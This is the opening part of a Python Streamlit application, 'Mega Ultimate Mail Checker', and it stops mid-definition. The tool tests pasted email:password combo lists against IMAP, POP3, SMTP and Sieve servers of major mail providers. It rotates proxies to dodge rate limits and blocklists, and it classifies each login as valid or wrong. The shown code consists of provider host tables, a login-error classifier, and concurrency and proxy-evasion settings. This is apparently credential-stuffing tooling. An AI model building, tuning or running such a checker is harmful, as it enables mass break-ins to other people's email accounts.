# @@FILE app.py blocks=111 version=v13.40
# @@BLOCK 000 FILE_HEADER deps=-
"""
Mega Ultimate Mail Checker - v13.40  (BLOCK EDITION)
====================================================
Full version history lives in CHANGELOG.md.

HOW THIS FILE IS ORGANISED
--------------------------
Every section is a NAMED, NUMBERED, REPLACEABLE BLOCK:

    # @@BLOCK 016 PROXY_407_CONTRACT deps=-
    ...
    # @@END 016 PROXY_407_CONTRACT

* To change behaviour, REPLACE A WHOLE BLOCK - never edit inside one.
* The @@BLOCK / @@END lines are part of the contract. Keep the id and the
  NAME byte-for-byte, and keep the block ids ascending.
* `python verify_blocks.py` proves the frame: ids contiguous, every block
  closed, deps earlier, nothing between blocks, no non-ASCII outside a
  comment or a string, and the file still compiles.
* `deps=` lists what a block reads from. If you change the names a block
  PUBLISHES, every dependent block must be re-issued too.
* Blocks 000..110 in ascending order ARE the execution order.

FIX LEDGER (every entry names the block it lands in)
----------------------------------------------------
P0-1  a WRONG verdict returned on rung 1 on any domain with a single local
      host: the confirmation pool counted only LOCAL hosts and the current
      host was already in tried_hosts.                     [101]
P0-2  allow_direct was latched BEFORE the proxy phase, so in Proxy Mode =
      aggressive with Retry CF off a 407-flooded proxy phase could never
      fall through to DIRECT.                              [103]
P0-3  status.py tested the greedy _APP_PASSWORD tokens (oauth / tenant /
      consent / mfa / 2fa) BEFORE _WRONG_STRONG, and _RETRY owned
      backend / upstream / downstream / unavailable.       [status.py 003, 008]
P0-4  the duplicate WRONG block after the first return in
      _handle_app_or_wrong was unreachable dead code and broke
      verify_v1337.py.                                     [101]
P1-1  only valid_results was rehydrated from disk, so a session reset wiped
      every other bucket and every log.                    [037]
P1-2  the combos text_area and the file uploader had no key=, so a paste
      could vanish on a rerun.                             [037]
P1-3  build_diagnostics_text() ran on EVERY rerun inside a collapsed
      expander.                                            [081]
P1-4  the per-account report dataframe was rebuilt every 0.12s. [106]
P2-1  PROXY_407_FORCE_DIRECT 3 -> 2, and the same-node 407 retry now needs
      real window left instead of 3s.                      [016, 102]
P2-2  [data-testid="stHeader"]{height:2.1rem} fought Streamlit's own header;
      [data-testid="stSidebar"] * clobbered sidebar icons. [032]
P2-3  the 13-metric rows collided on a phone.              [035]

NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
proxies.txt / Streamlit secrets / live DNS / live ip-api.
"""
# @@END 000 FILE_HEADER

# @@BLOCK 001 IMPORTS deps=-
import base64
import glob
import html
import imaplib
import json
import os
import platform
import poplib
import random
import re
import socket
import ssl
import sys
import threading
import time
import warnings
import zipfile
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import List
from urllib.parse import urlparse

import pandas as pd
import streamlit as str_lit
# @@END 001 IMPORTS

# @@BLOCK 002 HOSTS_IMPORT_FALLBACK deps=-
HOSTS_OK = True
HOSTS_HAS_RANKING = True
HOSTS_IMPORT_NOTE = ""

try:
    from hosts import (conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT,
                       MS_DOMAINS, GMAIL_DOMAINS,
                       smtp_candidates as host_smtp_candidates)
except Exception as _hosts_core_err:
    HOSTS_OK = False
    HOSTS_IMPORT_NOTE = (f"hosts.py core import failed ({_hosts_core_err}); "
                         f"using built-in tables.")
    STRICT_APP = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com",
                  "live.com", "windowslive.com"}
    ZERO_ACCESS = {"proton.me", "protonmail.com", "pm.me", "tuta.io",
                   "tutanota.com", "tutamail.com", "tuta.com"}
    PARENT = {"memoad.jp": "biglobe.ne.jp"}
    MS_DOMAINS = {"outlook.com", "hotmail.com", "live.com", "msn.com", "hotmail.co.uk"}
    GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}

    def host_smtp_candidates(domain):
        return []

    _BB_STATIC_CONF = {
        "gmail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "googlemail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "outlook.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "hotmail.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "live.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "msn.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "yahoo.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "ymail.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btinternet.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "bt.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btopenworld.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "talk21.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "sky.com": (["imap.tools.sky.com"], ["imap.tools.sky.com"]),
        "virginmedia.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "ntlworld.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "blueyonder.co.uk": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "aol.com": (["imap.aol.com"], ["pop.aol.com"]),
        "icloud.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "me.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "zoho.com": (["imap.zoho.com"], ["pop.zoho.com"]),
        "gmx.net": (["imap.gmx.net"], ["pop.gmx.net"]),
        "gmx.de": (["imap.gmx.net"], ["pop.gmx.net"]),
        "web.de": (["imap.web.de"], ["pop3.web.de"]),
        "t-online.de": (["secureimap.t-online.de"], ["securepop.t-online.de"]),
        "freenet.de": (["imap.freenet.de"], ["pop.freenet.de"]),
        "free.fr": (["imap.free.fr"], ["pop.free.fr"]),
        "orange.fr": (["imap.orange.fr"], ["pop.orange.fr"]),
        "qq.com": (["imap.qq.com"], ["pop.qq.com"]),
        "naver.com": (["imap.naver.com"], ["pop.naver.com"]),
    }

    def host_conf(domain):
        domain = (domain or "").lower().strip()
        if domain in ZERO_ACCESS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
        got = _BB_STATIC_CONF.get(domain)
        if got:
            return {"imap": list(got[0]), "pop": list(got[1]), "pop3": list(got[1])}
        return None
# @@END 002 HOSTS_IMPORT_FALLBACK

# @@BLOCK 003 HOSTS_RANK_FALLBACK deps=-
try:
    from hosts import rank_hosts as host_rank_hosts, is_junk_host as host_is_junk
except Exception as _hosts_rank_err:
    HOSTS_HAS_RANKING = False
    _note = (f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); "
             f"using built-in ranking.")
    HOSTS_IMPORT_NOTE = (HOSTS_IMPORT_NOTE + " " + _note).strip() if HOSTS_IMPORT_NOTE else _note

    _BB_ROUTER_LABEL_EXACT = re.compile(
        r"^(?:"
        r"mx|mx\d+|mta|mtas|mta\d+|smtp|smtps|smtpout|smtp-in|smtp-out|"
        r"inbound|outbound|relay|relay\d+|spool|filter|filters|cluster|clust\d+|"
        r"edge|edge\d+|gateway|gw|gw\d+|router|mailrouter|aspmx|aspmx\d*|"
        r"alt\d+|protection|hs|lb|"
        r"mx-aol|mx-aol\.mail|mx\.google|eur\.olc|olc\.protection"
        r")$"
    )
    _BB_ROUTER_TOKENS = (
        "mta", "smtp", "relay", "inbound", "outbound", "spool",
        "filter", "cluster", "mailrouter", "olc.protection",
        "protection.outlook", "aspmx", "gateway",
    )
    _BB_SERVICE_PREFIXES = (
        "imap", "imaps", "imap2", "mail", "mail2", "pop", "pop3", "pop3s",
        "webmail", "webmail2", "email", "correo", "zimbra", "zcs",
        "secure", "ssl", "outlook", "exchange", "owa",
    )
    _BB_SKIP_LABELS = {"mail", "email", "webmail", "imap", "imaps", "pop",
                       "pop3", "smtp", "correo"}

    def host_is_junk(host, domain=None):
        h = (host or "").lower().strip().strip(".")
        if not h:
            return True
        if domain and h == (domain or "").lower().strip():
            return True
        labels = h.split(".")
        if len(labels) < 2:
            return False
        for lab in labels[:-1]:
            if _BB_ROUTER_LABEL_EXACT.match(lab):
                return True
        for lab in labels[:-1]:
            if lab in _BB_SKIP_LABELS:
                continue
            if any(tok in lab for tok in _BB_ROUTER_TOKENS):
                return True
            if re.search(r"(?:^|[-_])mx\d*(?:$|[-_])", lab):
                return True
        return False

    def _bb_tier(host, domain):
        h = (host or "").lower().strip().strip(".")
        d = (domain or "").lower().strip().strip(".")
        if not h:
            return 4
        if d and h == d:
            return 3
        if d and h.endswith("." + d):
            if host_is_junk(h, d):
                return 3
            if h[: -(len(d) + 1)].split(".")[0] in _BB_SERVICE_PREFIXES:
                return 0
            return 1
        if host_is_junk(h, d):
            return 3
        return 2

    def _bb_resolves(host):
        try:
            socket.getaddrinfo(host, None)
            return True
        except Exception:
            return False

    _bb_probe_lock = threading.Lock()
    _bb_probe_cache = {}
    _BB_PROBE_TTL = 600

    def _bb_port_open(host, port, timeout=1.5):
        try:
            _s = socket.create_connection((host, port), timeout=timeout)
            _s.close()
            return True
        except Exception:
            return False

    def _bb_probe(host):
        if not host:
            return False
        now = time.time()
        with _bb_probe_lock:
            hit = _bb_probe_cache.get(host)
            if hit and now - hit[0] < _BB_PROBE_TTL:
                return hit[1]
        ok = _bb_port_open(host, 993) or _bb_port_open(host, 143)
        with _bb_probe_lock:
            _bb_probe_cache[host] = (now, ok)
        return ok

    def host_rank_hosts(hosts, domain, probe=True):
        hosts = [h for h in (hosts or []) if h]
        if not hosts:
            return []
        indexed = list(enumerate(hosts))
        if not probe:
            indexed.sort(key=lambda t: (0 if _bb_resolves(t[1]) else 1,
                                        _bb_tier(t[1], domain), t[0]))
            return [h for _i, h in indexed]
        tiers = {h: _bb_tier(h, domain) for h in set(hosts)}
        resolves = {h: _bb_resolves(h) for h in set(hosts)}
        to_probe = [h for h in dict.fromkeys(hosts) if tiers[h] <= 1 and resolves[h]][:6]
        live = {}
        if to_probe:
            try:
                with ThreadPoolExecutor(max_workers=min(6, len(to_probe))) as ex:
                    futs = {ex.submit(_bb_probe, h): h for h in to_probe}
                    for fut in as_completed(futs, timeout=6):
                        h = futs[fut]
                        try:
                            live[h] = fut.result()
                        except Exception:
                            live[h] = False
            except Exception:
                pass
        indexed.sort(key=lambda t: (
            0 if resolves.get(t[1], False) else 1,
            tiers.get(t[1], 4),
            0 if live.get(t[1], False) else 1,
            t[0],
        ))
        return [h for _i, h in indexed]

# --- v13.25: delegate host merging to hosts.py so FAMILY_PRIORITY applies ---
try:
    from hosts import (merge_domain_guesses as _hosts_merge_guesses,
                       _family_priority as _hosts_family_priority)
    _HAVE_HOSTS_MERGE = True
except Exception:
    _HAVE_HOSTS_MERGE = False
# @@END 003 HOSTS_RANK_FALLBACK

# @@BLOCK 004 STATUS_IMPORT_FALLBACK deps=-
try:
    from status import (
        VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
        FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
        SKIP, SKIPPED_COOLDOWN, UNKNOWN,
        RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
        LOGIN_DROPPED,
        ALL_STATUSES as ST_ALL, LABELS as ST_LABELS, COLORS as ST_COLORS,
        PRIORITY as ST_PRIORITY,
        classify_error as st_classify, is_proxy_level_error as st_proxy_level,
        display as st_display, color as st_color,
    )
    STATUS_OK = True
    STATUS_IMPORT_NOTE = "status.py loaded (real classifier active)."
except Exception as _status_err:
    STATUS_OK = False
    STATUS_IMPORT_NOTE = f"status.py import failed ({_status_err}); using inline fallback."
    warnings.warn(STATUS_IMPORT_NOTE)
    VALID = "valid"
    WRONG = WRONG_PASSWORD = "wrong_password"
    APP = NEED_APP_PASSWORD = "need_app_password"
    FAILED = CONNECTION_FAILED = "connection_failed"
    PROXY_UNHEALTHY = "proxy_unhealthy"
    SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
    UNKNOWN = "unknown"
    RETRY = RETRY_LATER = "retry_later"
    RBL = RBL_BLOCKED = "rbl_blocked"
    SMTP_FAILED = "smtp_failed"
    DNS_FAILED = "dns_failed"
    LOGIN_DROPPED = "login_dropped"
    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, LOGIN_DROPPED, RETRY_LATER,
              RBL_BLOCKED, SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED,
              PROXY_UNHEALTHY, UNKNOWN, SKIPPED_COOLDOWN]
    ST_LABELS = {s: s.upper() for s in ST_ALL}
    ST_COLORS = {
        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", LOGIN_DROPPED: "#f43f5e",
        CONNECTION_FAILED: "#eab308", PROXY_UNHEALTHY: "#e879f9",
        NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
        SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
        SKIPPED_COOLDOWN: "#a78bfa",
    }
    ST_PRIORITY = {
        VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
        LOGIN_DROPPED: 4, RETRY_LATER: 5, SMTP_FAILED: 6, DNS_FAILED: 7,
        CONNECTION_FAILED: 8, PROXY_UNHEALTHY: 9, UNKNOWN: 10, SKIPPED_COOLDOWN: 11,
    }

    # FIX P0-3: order mirrors status.py - WRONG_STRONG before the greedy APP
    # tokens, and _RETRY no longer owns backend/upstream/downstream.
    _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                        "authentication failed", "invalid credentials",
                        "invalid user name or password", "login incorrect",
                        "wrong password", "authenticate error",
                        "invalid login or password")
    _FB_APP = ("app password", "application specific password",
               "application-specific password", "app-specific password",
               "basic authentication is disabled", "basic auth is disabled",
               "basicauthenticationdisabled", "web login required",
               "via your web browser", "less secure app", "lesssecureapp",
               "oauth", "oauth2", "token required", "an app password is required",
               "use an app password", "enable imap", "imap access is disabled",
               "imap is disabled", "pop access is disabled", "enable pop",
               "2fa", "2-step", "2 step", "mfa", "multi-factor", "multi factor",
               "two-factor", "two factor", "modern authentication",
               "sign in with", "log in with your browser", "consent", "tenant",
               "aadsts50076", "aadsts50079", "aadsts50074", "strongauth")
    _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
               "blacklist", "blacklisted", "ip blocked")
    _FB_DNS = ("does not resolve", "failed to resolve", "name or service not known",
               "nodename nor servname", "getaddrinfo", "gaierror",
               "no address associated", "temporary failure in name resolution",
               "nxdomain", "servfail")
    _FB_RETRY_HARD = ("too many", "limit", "quota", "busy", "throttle",
                      "rate limit", "try again", "temporarily unavailable")
    _FB_SERVER_DROP = ("terminating connection", "imap server terminating",
                       "server terminating", "* bye", " bye ", "bye ",
                       "auth process broken", "connection is closed",
                       "server closed the connection", "server dropped the connection")
    _FB_CONN_STRONG = ("connection reset by peer", "connection reset", "reset by peer",
                       "connection refused", "connection aborted", "connection closed",
                       "connection dropped", "connection lost", "connection failure",
                       "broken pipe", "unexpected eof", "eof occurred", "socket error",
                       "socket closed", "socket timeout", "bad file descriptor",
                       "network is unreachable", "no route to host", "host is down",
                       "timed out", "timeout", "timedout", "ssl", "tls",
                       "wrong version number", "handshake", "certificate",
                       "cert verify", "cannot connect", "unable to connect",
                       "failed to connect", "connect failed", "negotiation failure",
                       "not supported by server", "stls not supported",
                       "starttls not supported", "tls not supported", "imap4rev1")
    _FB_RETRY = ("lookup failed", "user could not be routed", "could not route",
                 "retry", "try again", "temporarily unavailable", "temporary failure",
                 "service unavailable", "server busy", "too many", "rate limit",
                 "ratelimit", "throttle", "throttled", "over quota", "quota exceeded",
                 "mailbox full", "system busy", "try later", "unavailable",
                 "authentication services unavailable", "greylist", "greylisted",
                 "unexpected extra arguments")
    _FB_CONN = ("407", "proxy authentication", "proxy auth", "proxyconnect",
                "proxy connect", "proxy route", "bad proxy format", "proxy", "socks")
    _FB_WRONG = ("authenticate failed", "authentication error", "auth failed",
                 "auth failure", "invalid credential", "invalid login",
                 "invalid password", "invalid user", "invalid username",
                 "invalid user name", "invalid account", "login failed",
                 "login failure", "login returned non-ok", "login non-ok",
                 "login error", "password incorrect", "password invalid",
                 "incorrect password", "realmless", "auth error", "[auth]",
                 "authentication", "not authenticated", "bad credentials",
                 "bad username", "bad password", "logon failure",
                 "username and password not accepted", "user rejected",
                 "password rejected", "invalid token", "expired token",
                 "internal server error", "535")
    _FB_BARE = ("login", "logon", "auth", "authenticate", "authentication",
                "sign in", "signin", "sign-in", "credentials", "invalid")

    def st_classify(raw, domain=""):
        t = (raw or "").strip().lower()
        if not t:
            return UNKNOWN
        if t.strip().rstrip(".:!,;").strip() in _FB_BARE:
            return WRONG_PASSWORD
        for table, val in ((_FB_WRONG_STRONG, WRONG_PASSWORD),
                           (_FB_APP, NEED_APP_PASSWORD),
                           (_FB_RBL, RBL_BLOCKED),
                           (_FB_DNS, DNS_FAILED),
                           (_FB_RETRY_HARD, RETRY_LATER),
                           (_FB_SERVER_DROP, LOGIN_DROPPED),
                           (_FB_CONN_STRONG, CONNECTION_FAILED),
                           (_FB_RETRY, RETRY_LATER),
                           (_FB_CONN, CONNECTION_FAILED),
                           (_FB_WRONG, WRONG_PASSWORD)):
            if any(n in t for n in table):
                return val
        return UNKNOWN

    def st_proxy_level(raw):
        s = (raw or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))

    def st_display(s):
        return ST_LABELS.get(s, s)

    def st_color(s):
        return ST_COLORS.get(s, "#cbd5e1")
# @@END 004 STATUS_IMPORT_FALLBACK

# @@BLOCK 005 MSOAUTH_IMPORT deps=-
try:
    import ms_oauth
    MS_OAUTH_OK = True
except Exception:
    ms_oauth = None
    MS_OAUTH_OK = False

if not MS_OAUTH_OK:
    warnings.warn("ms_oauth.py unavailable; Microsoft accounts will report "
                  "NEED_APP_PASSWORD and never validate without an app password.")
# @@END 005 MSOAUTH_IMPORT

# @@BLOCK 006 OPTIONAL_LIBS deps=-
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

if not SOCKS_OK:
    warnings.warn("PySocks is not installed! SOCKS proxy support disabled. "
                  "Run 'pip install PySocks'.")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
# @@END 006 OPTIONAL_LIBS

# @@BLOCK 007 PAGE_CONFIG deps=-
# MUST be the first Streamlit call in the process.
str_lit.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="collapsed",
)
# @@END 007 PAGE_CONFIG

# @@BLOCK 008 BUILD_IDENTITY deps=-
# Bump CFG_VERSION whenever a DEFAULT changes in a way users should inherit.
CFG_VERSION = 1340
BUILD_TAG = "v13.40"
# @@END 008 BUILD_IDENTITY

# @@BLOCK 009 TIMING_CONSTANTS deps=-
PROBE_TIMEOUT_DEFAULT = 8.0
PROXY_PRECHECK_TIMEOUT_DEFAULT = 5
CONNECT_FLOOR_DEFAULT = 10.0
READ_FLOOR_DEFAULT = 15.0
CONNECT_FLOOR_MIN = 10.0
READ_FLOOR_MIN = 15.0
ATTEMPT_TIMEOUT_NORMAL = 15
ATTEMPT_TIMEOUT_FAST = 10
ATTEMPT_TIMEOUT_DEEP = 20
DEADLINE_NORMAL = 150.0
DEADLINE_FAST = 60.0
DEADLINE_DEEP = 240.0
WORKERS_NORMAL = 12
WORKERS_FAST = 30
WORKERS_DEEP = 8
RUNG_COST_MIN = 8.0
RUNG_COST_MAX = 12.0
WORK_FLOOR_FACTOR = 1.5
WORK_FLOOR_PAD = 15.0
ROTATE_SETTLE = 0.4
SLOW_RETRY_BACKOFF = 1.2
SAME_HOST_RETRIES_DEFAULT = 1
FAILURE_COOLDOWN_DEFAULT = 45.0
WORKER_FUTURE_PAD = 60
GEO_CACHE_TTL = 600
PROBE_RESULT_TTL = 120
LEGACY_RUNG_TIMEOUT = 8.0
LEGACY_PORTS = (143, 110)
GEO_FAIL_TTL = 300.0
GEO_MIN_INTERVAL = 60.0 / 45.0
# @@END 009 TIMING_CONSTANTS

# @@BLOCK 010 PHASE_FRACTIONS deps=-
# Split of the per-account budget between the proxy phase and the direct phase.
PROXY_PRIMARY_FRAC = 0.40
PROXY_TOTAL_FRAC = 0.58
DIRECT_PRIMARY_FRAC = 0.72
DIRECT_FIRST_DIRECT_PRIMARY_FRAC = 0.35
DIRECT_FIRST_DIRECT_TOTAL_FRAC = 0.55
DIRECT_FIRST_PROXY_START_FRAC = 0.58
# @@END 010 PHASE_FRACTIONS

# @@BLOCK 011 PROTOCOL_CONSTANTS deps=-
PROTOCOL_IMAP = "IMAP"
PROTOCOL_POP = "POP3"
PROTOCOL_SMTP = "SMTP"
PROTOCOL_SIEVE = "ManageSieve"
PROTOCOL_OPTIONS = [PROTOCOL_IMAP, PROTOCOL_POP, PROTOCOL_SMTP, PROTOCOL_SIEVE]
PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP, PROTOCOL_POP]

RUNG_IMAP = "IMAP"
RUNG_POP = "POP"
RUNG_SMTP = "SMTP"
RUNG_SIEVE = "SIEVE"

SMTP_RUNG_PORTS = ((587, "starttls"), (465, "ssl"), (25, "plain"))
SIEVE_PORT = 4190
SMTP_HOST_CAP = 1
# @@END 011 PROTOCOL_CONSTANTS

# @@BLOCK 012 CONCURRENCY_CONSTANTS deps=-
PROXY_CONCURRENCY_DEFAULT = 4
HOST_CONCURRENCY_DEFAULT = 2
PROXY_IP_CONCURRENCY_DEFAULT = 1
PROXY_SUBUSER_CONCURRENCY_DEFAULT = 1
PROBE_WORKERS_DEFAULT = 3
PROBE_WORKERS_BUSY = 2
PROBE_WORKERS_BULK = 6


def _gate_wait(attempt_to: float) -> float:
    """How long a gate will wait before giving up and barging through."""
    try:
        return max(6.0, float(attempt_to) * 1.5)
    except Exception:
        return 6.0
# @@END 012 CONCURRENCY_CONSTANTS

# @@BLOCK 013 FRUGALITY_CONSTANTS deps=-
PROBER_IDLE_SLEEP = 300.0
PROBER_BUSY_SLEEP = 10.0
PROBER_STALE_WHILE_RUNNING = 300.0
PROBER_IDLE_ENABLED_DEFAULT = False
PROBE_SECOND_SCHEME_DEFAULT = False
PROBE_MAX_TARGETS_DEFAULT = 1
# @@END 013 FRUGALITY_CONSTANTS

# @@BLOCK 014 UI_RENDER_CONSTANTS deps=-
PROBE_BATCH_BUDGET = 120.0
PROBE_BUDGET_START = 120.0
UI_MIN_INTERVAL = 0.12
BUCKET_RENDER_TAIL = 40
LOG_CAP_DEBUG = 400
LOG_CAP_QUIET = 120
REPORT_ENTRIES_MAX = 2000
# FIX P1-3 / P1-4: the two per-rerun and per-account hogs get their own clocks.
DIAG_CACHE_TTL = 30.0
REPORT_DF_MIN_INTERVAL = 1.0
# @@END 014 UI_RENDER_CONSTANTS

# @@BLOCK 015 MAIL_SPOT_CONSTANTS deps=-
MAIL_SPOT_CHECK_DEFAULT = True
MAIL_SPOT_NODES = 3
MAIL_SPOT_TIMEOUT = 6.0
MAIL_SPOT_FALLBACK = ("imap.gmail.com", 993)
# @@END 015 MAIL_SPOT_CONSTANTS

# @@BLOCK 016 PROXY_407_CONTRACT deps=-
# FIX P2-1: every 407ing proxy attempt is a request that cannot succeed, and a
# same-node retry costs a whole attempt.  3 strikes per rung let a single rung
# spend ~4 x 28s before the storm breaker armed.  2 is the working number.
PROXY_407_QUARANTINE = 3
PROXY_407_FORCE_DIRECT = 2
PROXY_407_BACKOFF = 0.8
PROXY_407_COOLDOWN = 90.0
# A same-node 407 retry only makes sense if a REAL attempt still fits.
PROXY_407_RETRY_WINDOW_FACTOR = 1.6
# @@END 016 PROXY_407_CONTRACT

# @@BLOCK 017 POOL_FILTER_CONSTANTS deps=-
MAX_ROTATIONS_DEFAULT = 2
CHECK_PASS2_DEFAULT = False
DEDUPE_PROXIES_DEFAULT = True
PROBE_STRICT_DEFAULT = True
MIN_PROXY_SCORE_DEFAULT = 10
BLACKLIST_CF_DEFAULT = 15
CIRCUIT_BREAKER_SECONDS = 30.0
# @@END 017 POOL_FILTER_CONSTANTS

# @@BLOCK 018 PROBE_TARGET_TABLES deps=-
PROBE_TARGET_AUTO = "auto (from combo list)"
PROBE_TARGET_DEFAULT = "443 (HTTPS)"
PROBE_TARGET_OPTIONS = [
    PROBE_TARGET_AUTO,
    "993 (IMAP)",
    "443 (HTTPS)",
    "windstream 993",
    "windstream 995",
    "both (either)",
]
PROBE_TARGET_PORTS = {
    PROBE_TARGET_AUTO: [("imap.gmail.com", 993, "auto")],
    "993 (IMAP)": [("imap.gmail.com", 993, "993")],
    "443 (HTTPS)": [("api.ipify.org", 443, "443")],
    "windstream 993": [("imap.windstream.net", 993, "ws-imap993")],
    "windstream 995": [("pop.windstream.net", 995, "ws-pop995")],
    "both (either)": [("imap.gmail.com", 993, "993"), ("api.ipify.org", 443, "443")],
}
# @@END 018 PROBE_TARGET_TABLES

# @@BLOCK 019 SETTING_DEFAULTS deps=-
SETTING_DEFAULTS = {
    "ui_mode": "Normal Mode",
    "ui_protocols": list(PROTOCOL_SELECTION_DEFAULT),
    "ui_workers": WORKERS_NORMAL,
    "ui_deadline": int(DEADLINE_NORMAL),
    "ui_timeout": ATTEMPT_TIMEOUT_NORMAL,
    "ui_max_acc": 5000,
    "ui_blacklist_cf": BLACKLIST_CF_DEFAULT,
    "ui_dynamic_scaling": True,
    "ui_max_hosts": 3,
    "ui_alt_user": True,
    "ui_confirm_wrong": True,
    "ui_smtp_precheck": False,
    "ui_min_proxy_score": MIN_PROXY_SCORE_DEFAULT,
    "ui_probe_precheck_timeout": PROXY_PRECHECK_TIMEOUT_DEFAULT,
    "ui_probe_timeout": int(PROBE_TIMEOUT_DEFAULT),
    "ui_probe_target": PROBE_TARGET_DEFAULT,
    "ui_probe_strict": PROBE_STRICT_DEFAULT,
    "ui_probe_maxtargets": PROBE_MAX_TARGETS_DEFAULT,
    "ui_probe_scheme2": PROBE_SECOND_SCHEME_DEFAULT,
    "ui_prober_idle": PROBER_IDLE_ENABLED_DEFAULT,
    "ui_probe_sample": 0,
    "ui_mail_spot": MAIL_SPOT_CHECK_DEFAULT,
    "ui_dedupe": DEDUPE_PROXIES_DEFAULT,
    "ui_allow_blacklist": False,
    "ui_quarantine": True,
    "ui_host_conc": HOST_CONCURRENCY_DEFAULT,
    "ui_ip_conc": PROXY_IP_CONCURRENCY_DEFAULT,
    "ui_subuser_conc": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
    "ui_proxy_conc": PROXY_CONCURRENCY_DEFAULT,
    "ui_direct_first": False,
    "ui_same_host_retries": SAME_HOST_RETRIES_DEFAULT,
    "ui_max_rot": MAX_ROTATIONS_DEFAULT,
    "ui_pass2": CHECK_PASS2_DEFAULT,
    "ui_random_rot": True,
    "ui_geo_call": False,
    "ui_conn_hint": "Auto",
    "ui_starttls": True,
    "ui_proxy_mode": "fallback",
    "chk_use_proxy": True,
    "chk_retry_cf": True,
    "chk_self_signed": True,
    "chk_proxy_test_flight": True,
    "chk_skip_app": False,
    "chk_debug_mode": True,
}
# @@END 019 SETTING_DEFAULTS

# @@BLOCK 020 DEFAULT_CFG deps=019
def default_cfg() -> dict:
    """The config dict produced when EVERY settings widget sits on its default."""
    return {
        "MODE_NAME": "Normal",
        "PROTOCOLS": list(PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": WORKERS_NORMAL,
        "MAX_WORKERS_MAX": max(WORKERS_NORMAL * 2, 50),
        "TIMEOUT": ATTEMPT_TIMEOUT_NORMAL,
        "ACCOUNT_DEADLINE": int(DEADLINE_NORMAL),
        "MAX_ACCOUNTS": 5000,
        "BLACKLIST_CF": BLACKLIST_CF_DEFAULT,
        "PROXY_MODE": "fallback",
        "RETRY_CONNECTION_FAILED": 1,
        "ALLOW_SELF_SIGNED": True,
        # TLS_STRICT stays False so the reset target matches ALLOW_SELF_SIGNED=True.
        # build_cfg() sets TLS_STRICT = not self_signed.
        "TLS_STRICT": False,
        "TRY_STARTTLS": True,
        "TRY_ALT_USERNAME": True,
        "CONFIRM_WRONG_ACROSS_HOSTS": True,
        "MAX_HOSTS_PER_DOMAIN": 3,
        "PROXY_TEST_FLIGHT": True,
        "SKIP_STRICT_APP_PROVIDERS": False,
        "DEBUG": True,
        "MIN_PROXY_SCORE": MIN_PROXY_SCORE_DEFAULT,
        "PROXY_PRECHECK_TIMEOUT": PROXY_PRECHECK_TIMEOUT_DEFAULT,
        "PROBE_TIMEOUT": int(PROBE_TIMEOUT_DEFAULT),
        "PROBE_TARGET": PROBE_TARGET_DEFAULT,
        "PROBE_STRICT": PROBE_STRICT_DEFAULT,
        "PROBE_MAX_TARGETS": PROBE_MAX_TARGETS_DEFAULT,
        "PROBE_SECOND_SCHEME": PROBE_SECOND_SCHEME_DEFAULT,
        "PROBER_IDLE_ENABLED": PROBER_IDLE_ENABLED_DEFAULT,
        "PROBE_SAMPLE_MAX": 0,
        "MAIL_SPOT_CHECK": MAIL_SPOT_CHECK_DEFAULT,
        "DEDUPE_PROXIES": DEDUPE_PROXIES_DEFAULT,
        "ALLOW_BLACKLIST_IPS": False,
        "QUARANTINE_407": True,
        "HOST_CONCURRENCY": HOST_CONCURRENCY_DEFAULT,
        "PROXY_IP_CONCURRENCY": PROXY_IP_CONCURRENCY_DEFAULT,
        "PROXY_SUBUSER_CONCURRENCY": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
        "PROXY_CONCURRENCY": PROXY_CONCURRENCY_DEFAULT,
        "DIRECT_FIRST": False,
